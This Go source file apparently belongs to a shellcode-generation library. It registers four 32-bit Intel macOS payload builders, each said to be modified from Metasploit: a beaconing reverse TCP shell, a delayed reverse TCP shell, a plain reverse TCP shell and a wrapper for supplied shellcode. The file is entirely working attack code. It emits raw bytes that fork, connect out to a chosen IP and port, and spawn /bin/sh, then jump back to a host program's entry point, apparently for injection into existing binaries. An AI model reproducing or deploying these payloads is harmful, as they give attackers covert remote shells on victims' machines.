package modules

import "github.com/awgh/shellcode/api"

func init() {
	api.RegisterShellCode(api.Darwin, api.Intel, api.Bits32,
		"beaconing_reverse_shell_tcp", beaconing_reverse_shell_tcp_darwin_intel_32)
	api.RegisterShellCode(api.Darwin, api.Intel, api.Bits32,
		"delay_reverse_tcp_shell", delay_reverse_tcp_shell_darwin_intel_32)
	api.RegisterShellCode(api.Darwin, api.Intel, api.Bits32,
		"reverse_tcp_shell", reverse_tcp_shell_darwin_intel_32)
	api.RegisterShellCode(api.Darwin, api.Intel, api.Bits32,
		"user_shellcode", user_shellcode_darwin_intel_32)
}

func beaconing_reverse_shell_tcp_darwin_intel_32(params api.Parameters) ([]byte, error) {

	port := params.Port
	entry := params.Entry
	beacon := uint32(0x0)
	ip := params.IP

	//Modified from metasploit
	shellcode2 := "\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2" // FORK
	//fork
	shellcode2 += "\x0f\x84" // TO TIME CHECK
	shellcode2 += "\x41\x00\x00\x00"
	shellcode2 += "\x68"
	shellcode2 += api.PackIP(ip)
	shellcode2 += "\x68\xff\x02"
	if ps, err := api.PackPort(port); err == nil {
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += "\x89\xe7\x31\xc0\x50" +
		"\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62" +
		"\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68" +
		"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53" +
		"\x50\xb0\x3b\xcd\x80"

	//Time Check
	shellcode2 += "\xB8\x74\x00\x00\x02\xcd\x80" // put system time in eax
	shellcode2 += "\x05"                         // add eax, 15  for seconds
	if as, err := api.PackUint32(beacon); err == nil {
		shellcode2 += as
	} else {
		return nil, err
	}
	shellcode2 += "\x89\xC3" + // mov ebx, eax
		"\xB8\x74\x00\x00\x02\xcd\x80" + // put system time in eax
		"\x39\xD8" + // cmp eax, ebx
		"\x0F\x85\xf1\xff\xff\xff" + // jne back to system time
		"\xe9\x8E\xff\xff\xff\xff" // jmp back to FORK

	//FORK to main program
	shellcode1 := "\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2"
	shellcode1 += "\x0f\x84"
	if int(entry) < 0 {
		if as, err := api.PackUint32(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	} else {
		if as, err := api.PackUint32(uint32(len(shellcode2)) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	}
	return []byte(shellcode1 + shellcode2), nil
}

func delay_reverse_tcp_shell_darwin_intel_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry
	beacon := uint32(0x0)
	ip := params.IP

	//Modified from metasploit

	shellcode2 := "\xB8\x74\x00\x00\x02\xcd\x80" // put system time in eax
	shellcode2 += "\x05"                         // add eax, 15  for seconds
	if as, err := api.PackUint32(beacon); err == nil {
		shellcode2 += as
	} else {
		return nil, err
	}
	shellcode2 += "\x89\xC3" + // mov ebx, eax
		"\xB8\x74\x00\x00\x02\xcd\x80" + // put system time in eax
		"\x39\xD8" + // cmp eax, ebx
		"\x0F\x85\xf1\xff\xff\xff" // jne back to system time

	shellcode2 += "\x68"
	shellcode2 += api.PackIP(ip)
	shellcode2 += "\x68\xff\x02"
	if ps, err := api.PackPort(port); err == nil {
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += "\x89\xe7\x31\xc0\x50" +
		"\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62" +
		"\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68" +
		"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53" +
		"\x50\xb0\x3b\xcd\x80"

	shellcode1 := "\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2"
	shellcode1 += "\x0f\x84"
	if int(entry) < 0 {
		if as, err := api.PackUint32(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	} else {
		if as, err := api.PackUint32(uint32(len(shellcode2)) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	}
	return []byte(shellcode1 + shellcode2), nil
}

func reverse_tcp_shell_darwin_intel_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry
	ip := params.IP

	//Modified from metasploit
	shellcode2 := "\x68"
	shellcode2 += api.PackIP(ip)
	shellcode2 += "\x68\xff\x02"
	if ps, err := api.PackPort(port); err == nil {
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += "\x89\xe7\x31\xc0\x50" +
		"\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62" +
		"\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68" +
		"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53" +
		"\x50\xb0\x3b\xcd\x80"

	shellcode1 := "\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2"
	shellcode1 += "\x0f\x84"
	if int(entry) < 0 {
		if as, err := api.PackUint32(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	} else {
		if as, err := api.PackUint32(uint32(len(shellcode2)) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	}
	return []byte(shellcode1 + shellcode2), nil
}

func user_shellcode_darwin_intel_32(params api.Parameters) ([]byte, error) {
	entry := params.Entry
	supplied_shellcode := params.ShellCode

	shellcode1 := "\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2"
	shellcode1 += "\x0f\x84"
	if int(entry) < 0 {
		if as, err := api.PackUint32(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	} else {
		if as, err := api.PackUint32(uint32(len(supplied_shellcode)) + entry); err == nil {
			shellcode1 += as
		} else {
			return nil, err
		}
	}

	//SHELLCODE
	shellcode1 += string(supplied_shellcode)

	return []byte(shellcode1), nil
}
